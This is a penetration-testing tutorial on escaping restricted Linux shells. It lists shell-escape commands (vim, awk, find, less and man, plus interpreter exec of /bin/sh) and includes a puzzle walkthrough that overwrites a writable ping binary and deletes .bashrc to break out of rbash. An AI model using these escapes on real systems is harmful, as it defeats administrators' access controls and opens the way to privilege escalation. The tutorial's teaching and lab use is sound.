### Restricted Shell

Escaping Restricted Shell
Some sysadmins don't want their users to  have access to all commands. So they get a restriced shell. If the  hacker get access to a user with a restriced shell we need to be able to  break out of that, escape it, in order to have more power.
Many linux distros include rshell, which is a restriced shell.
To access the restried shell you can do this:
sh -r 
rsh

rbash
bash -r
bash --restricted

rksh
ksh -r
http://securebean.blogspot.cl/2014/05/escaping-restricted-shell_3.html?view=sidebar http://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells

A Restricted Shell... What Is It?
It  limits a user's ability and only allows them to perform a subset of  system commands. Typically, a combination of some or all of the  following restrictions are imposed by a restricted shell:
• Using the 'cd' command to change directories.
• Setting or unsetting certain environment variables (i.e. SHELL, PATH, etc...).
• Specifying command names that contain slashes.
• Specifying a filename containing a slash as an argument to the '.' built-in command.
• Specifying a filename containing a slash as an argument to the '-p' option to the 'hash' built-in command.
• Importing function definitions from the shell environment at startup.
• Parsing the value of SHELLOPTS from the shell environment at startup.
• Redirecting output using the '>', '>|', ", '>&', '&>', and '>>' redirection operators.
• Using the 'exec' built-in to replace the shell with another command.
• Adding or deleting built-in commands with the '-f' and '-d' options to the enable built-in.
• Using the 'enable' built-in command to enable disabled shell built-ins.
• Specifying the '-p' option to the 'command' built-in.
• Turning off restricted mode with 'set +r' or 'set +o restricted'.
Since  business needs override security a good portion of the time, it's  possible that some of the above restrictions are relaxed. So do not  assume that these restrictions are set in stone. I suggest you QC the  quality of the restricted shell.

Reconnaissance
The  first step should be to gather a little information. You'll need to  know your environment. Run the 'env' command to understand how your  profile is configured. You'll see which shell you're running and where  your PATH is pointing to. Once you know what your PATH is, list the  contents of the directory (i.e. 'ls /usr/local/rbin') to see which  commands are present. It is possible you may not be able to run the 'ls'  command. If not, you can use the 'echo' command with an asterisk to  'glob' directory contents if it's available:
echo /usr/local/rbin/*You  can continue on through the file system using this command to help you  find other files and commands. Basically, you'll be armed with built-in  shell commands as well as the ones listed in your PATH. This is your  arsenal for attacking the restricted shell, but there may be exceptions  as we'll find out. Once you know which commands you can execute,  research each one of them to see if there are known shell escapes  associated with them. Some of the techniques we're about to get into can  be combined together.


Change PATH or SHELL Environment Variables
Type  'export -p' to see the exported variables in the shell. What this will  also show you is which variables are read-only. You'll note that most  likely the PATH and SHELL variables are '-rx', which means you execute  them, but not write to them. If they are writeable, then you can start  giggling now as you'll be able to escape the restricted shell in no  time! If the SHELL variable is writeable, you can simply set it to your  shell of choice (i.e. sh, bash, ksh, etc...). If the PATH is writeable,  then you'll be able to set it to any directory you want. I recommend  setting it to one that has commands vulnerable to shell escapes.

Copying Files
If  you're able to copy files into your PATH, then you'll be able to bypass  the forward slash restriction. The sky is the limit at this point as  you can copy commands into the PATH that have known shell escapes. You  can also write your own script, copy it to the PATH, and execute it.
Another  technique is to try and copy files to your home directory and execute  them from there. Execution will be difficult as you will have to use  './' in order to get it to run, and as we already know, it will fail  since the restricted shell will not allow the use of a forward slash.  Keep in mind, you may be able to get the commands you copy to your home  directory to run if you're able to couple it with another command that  has a shell escape.
Other ways you may be able to copy files or  get access to them include mounting a device or file system. You may  also be able to copy them to your system using a program that can copy  files such as SCP or FTP.
Try to find directories other than your  PATH where you can execute commands from. If you have write access to  them, you can copy commands here and may be able to execute them.
Lastly, consider creating a symbolic link in a directory where you have write access and the ability to run commands


Editors
One  of the most well documented techniques is to spawn a shell from within  an editor such as 'vi' or 'vim'. Open any file using one of these  editors and type the following and execute it from within the editor:
:set shell=/bin/bash
Next, type and execute:
:shell

Another method is to type:
:! /bin/bash

If  either of these works, you will have an unrestricted shell from within  the editor. Most modern restricted shells already defend against this  hack, but it's always worth a shot. You may be working from a restricted  editor such as rvi or rvim, which will almost certainly stop a shell  from spawning. Also, try different shells with this technique and ones  that follow as some restricted shells may block 'sh' or 'bash'.

Awk Command
If you can run 'awk', you can attempt to execute a shell from within it.
Type the following:
awk 'BEGIN {system("/bin/sh")}'If successful, you'll see an unrestricted shell prompt!
Find Command
If the 'find' command is present, you can attempt to use the '-exec' function within it.
Type the following:
find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

Again,  if successful, you'll see a blinking cursor at an unrestricted shell  prompt! Note that in the above example, you are able to call the 'awk'  command even if it is not present in our PATH. This is important because  you are able to bypass the restriction of only being permitted to  execute commands in your PATH. You are not limited to the 'awk' command.
More, Less, and Man Commands
There  is a known escape within these commands. After you use the 'more',  'less', or 'man' command with a file, type '!' followed by a command.  For instance, try the following once inside the file:
'! /bin/sh'
'!/bin/sh'
'!bash'Like  the shell escape in 'awk' and 'find', if successful, you'll be sitting  at an unrestricted shell prompt. Note you can try different shells, and  the space after the '!' may not matter.

Tee Command
If  you do not have access to an editor, and would like to create a script,  you can make use of the 'tee' command. Since you cannot make use of  '>' or '>>', the 'tee' command can help you direct your output  when used in tandem with the 'echo' command. This is not a shell escape  in of itself, but consider the following:
echo "evil script code" | tee script.shYou  will be able to create a file called script.sh in your home directory  and add your script code to the file. Once the file is created, use the  'tee -a' option for all subsequent commands as the '-a' allows you to  append to the file rather than overwrite the file.

Favorite Language?
Try invoking a SHELL through your favorite language:
• python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
• perl -e 'exec "/bin/sh";'
• perl: exec "/bin/sh";
• ruby: exec "/bin/sh"
• lua: os.execute('/bin/sh')
• irb(main:001:0> exec "/bin/sh"
Most likely, you will not be able to execute any of these, but it's worth a shot in case they're installed.
Files Executed in Unrestricted Mode?
Some  restricted shells will start by running some files in an unrestricted  mode before the restricted shell is applied. If your .bash_profile is  executed in an unrestricted mode and it's editable, you'll be able to  execute code and commands as an unrestricted user.


============================================================================

There's a lot of documentation out there on escaping secure shell, a lot of common techniques like launching bash from within vi/vim. However, getting to that point can sometime be the trick. Here's something I haven't seen on any other site.

First up, recon!

Last login: Thu Oct 20 13:43:17 2011 from lcd01.local
confined1@someserver:~$ cd /
-rbash: cd: restricted
confined1@someserver:~$ ls -al
total 20
drwx------ 4 confined1 users 4096 2011-10-28 15:38 .
drwxr-xr-x 6 root        root  4096 2008-11-13 16:54 ..
-rw-r--r-- 1 root        root    40 2008-11-13 18:06 .bashrc
dr-xr-xr-x 2 root        root  4096 2007-09-12 11:50 bin
drwx------ 2 confined1 users 4096 2011-10-28 15:38 .cache
lrwxrwxrwx 1 root        root     7 2008-11-13 10:22 .profile -> .bashrc
confined1@someserver:~$ ls -al ~/bin
total 140
dr-xr-xr-x 2 root        root   4096 2007-09-12 11:50 .
drwx------ 4 confined1 users  4096 2011-10-28 15:38 ..
-rwxr-xr-x 1 root        root  77844 2007-03-05 07:25 ls
-rwxr-xrwx 1 root        root  30848 2007-03-05 05:25 ping
-rwxr-xr-x 1 root        root  14268 2007-03-05 07:25 tee
confined1@someserver:~$ touch test.sh
-rbash: /usr/bin/python: restricted: cannot specify `/' in command names
confined1@someserver:~$ vim
-rbash: /usr/bin/python: restricted: cannot specify `/' in command names
confined1@someserver:~$ export
declare -x HOME="/home/confined1"
declare -x LANG="en_US.UTF-8"
declare -x LOGNAME="confined1"
declare -x MAIL="/var/mail/confined1"
declare -x OLDPWD
declare -rx PATH="/home/confined1/bin"
declare -x PWD="/home/confined1"
declare -rx SHELL="/bin/rbash"
declare -x SHLVL="1"
declare -x SSH_CLIENT="10.201.2.18 44640 22"
declare -x SSH_CONNECTION="10.201.2.18 44640 192.168.200.253 22"
declare -x SSH_TTY="/dev/pts/0"
declare -x TERM="xterm"
declare -x USER="confined1"
declare -x XDG_SESSION_COOKIE="4c9b5ab174f19aff2abf9176491b333c-1319809118.232464-1090123774"
confined1@someserver:~$ 

What we should note:
Line 2 and 3, We are in a restricted shell (rbash) and confined to our directory
Line 8 and 9, We have our .bashrc file, and a bin directory
Line 17, Our bin directory has 3 files in it, and *glee* one of them (ping) is writeable by anyone!
Line 19 and 21, As we expected from a proper configuration, we can't create files, and we can't launch any programs outside of our PATH, including vim
Line 29 and 31, Here we see our PATH and our SHELL, which confirms we are in restricted mode. Worse yet, they are marked read only, no changing them... or is there...

That ping script is probably our ticket out, lets focus on that but first, a trick using the tee command.

When confined to a properly configured restricted shell, you cannot make use of > or >> to redirect your output, we also can't create files. However, when combined with echo, you can use tee to redirect it. For example...

echo '!#/bin/bash' | tee 'hw_script.sh'
echo 'echo Hello World' | tee -a 'hw_script.sh'

confined1@someserver:~$ ls -al
[...]
-rw-r--r-- 1 restricted1 users   29 2011-10-28 15:50 hw_script.sh
We not only created a file, we can write whatever we want in it! Too bad we can't execute it because trying to do so would involved a /, then again, it wouldn't if we were to call a command we could already use, like ping! We can use the same method to overwrite the ~/bin/ping file though, and that one we can run!

I'll skip the part where launching vi using the ping file doesn't work, you get the error message "Vim: Warning: Output is not to a terminal" because we didn't actually launch it in our terminal, our ping script did.

New direction, same method though, one of the easiest ways to escape a restricted shell is to change the variables. If we can set SHELL=/bin/bash we'll be free!. Again, skipping some experimentation, we can't change the variable as it's set to write only, neither can ping if we try to make it set the variable. However the system can set it! We just have to trick it into setting the variable.

When a terminal opens up, it reads .bashrc which tells it what behavior to default to. I used my ping script to cat my .bashrc
echo '#!/bin/bash' | tee '/home/confined1/bin/ping'
echo '/bin/cat /home/confined1/.bashrc' | tee -a '/home/confined1/bin/ping'

confined1@someserver:~$ ping
PATH=/home/confined1/bin
export PATH
confined1@someserver:~$

This is what I found. So if we change our .bashrc file so that instead of setting our PATH, it sets our SHELL then we should be free!

First, we use our ping script to remove the .bashrc file we don't want, then we use our tee trick to put a new one in it's place.
confined1@someserver:~$ echo '/bin/rm /home/confined1/.bashrc' | tee '/home/confined1/bin/ping'
/bin/rm /home/confined1/.bashrc
confined1@someserver:~$ ping
/bin/rm: remove write-protected regular file `/home/confined1/.bashrc'? y
confined1@someserver:~$ ls -al
total 16
drwx------ 4 confined1 users 4096 2011-10-28 15:47 .
drwxr-xr-x 6 root        root  4096 2008-11-13 16:54 ..
dr-xr-xr-x 2 root        root  4096 2007-09-12 11:50 bin
drwx------ 2 confined1 users 4096 2011-10-28 15:38 .cache
lrwxrwxrwx 1 root        root     7 2008-11-13 10:22 .profile -> .bashrc
confined1@someserver:~$ echo 'export SHELL=/bin/bash' | tee '/home/confined1/.bashrc'
export SHELL=/bin/bash
confined1@someserver:~$ ls -al
total 20
drwx------ 4 confined1 users 4096 2011-10-28 15:48 .
drwxr-xr-x 6 root        root  4096 2008-11-13 16:54 ..
-rw-r--r-- 1 confined1 users   23 2011-10-28 15:48 .bashrc
dr-xr-xr-x 2 root        root  4096 2007-09-12 11:50 bin
drwx------ 2 confined1 users 4096 2011-10-28 15:38 .cache
lrwxrwxrwx 1 root        root     7 2008-11-13 10:22 .profile -> .bashrc
confined1@someserver:~$

There we go, so now we log out, and back in again. When we log back in, our system will read our new .bashrc file and we'll be home free!

Last login: Fri Oct 28 15:38:34 2011 from 10.201.3.214
confined1@someserver:~$ export
declare -x HOME="/home/confined1"
declare -x LANG="en_US.UTF-8"
declare -x LOGNAME="confined1"
declare -x MAIL="/var/mail/confined1"
declare -x OLDPWD
declare -rx PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
declare -x PWD="/home/confined1"
declare -rx SHELL="/bin/bash"
declare -x SHLVL="1"
declare -x SSH_CLIENT="10.201.3.214 44532 22"
declare -x SSH_CONNECTION="10.201.3.214 44532 192.168.200.253 22"
declare -x SSH_TTY="/dev/pts/0"
declare -x TERM="xterm"
declare -x USER="confined1"
declare -x XDG_SESSION_COOKIE="4c9b5ab174f19aff2abf9176491b333c-1319809823.481121-174941990"
confined1@someserver:~$ cd ..
-rbash: cd: restricted
confined1@someserver:~$ date
Fri Oct 28 15:50:47 CEST 2011
confined1@someserver:~$
You can see that my SHELL variable says I should be using /bin/bash, but when I try to change directory, it tells me I'm still restricted. As a side effect though, since my .bashrc isn't setting my path anymore, I now have the PATH variable of a regular user, so I can launch any program I want, as you can see with date. Now I can launch vim! I should (and do) see the normal vim window, I execute the following...
:set shell=/bin/bash
<enter>
:shell
<enter>
and I'm free!
confined1@someserver:~$ cd ..
confined1@someserver:/home$

So to really sum things up, the only things I really needed to do is
1) Delete the .bashrc file, didn't need to create a new one
2) Disconnect/reconnect
2) Launch vim and launch a new shell from within
Total time including connecting: Under 5 minutes

Next up, privilege escalation, as soon as I can figure out how...

Edit: I'm finished updating this. Some of you may have noticed I changed my username and the server name, I did it so this puzzle couldn't be directly googled for an answer. Nearly everything I needed came from SANS Penetration Testing plus a little knowledge of how the shell worked.

Also, I'm still playing around with formatting on this blog. I really love pictures since you can highlight things you need and show users exactly what it looks like. The downside is that pictures aren't really searchable the way words are, and I want users to be able to find this. Let me know what you think.

Edit2: As it turns out I could have escaped shell right from the beginning by calling '/bin/bash' with ping, the downside is then my path is still set to my jailed directory. This is why I didn't realize I was out of rbash right away. You can use this command to escape rbash quicker, then then you have to either call each program with it's full extension, which takes longer, or change the PATH variable, in which case you may as well have gone with my first solution.


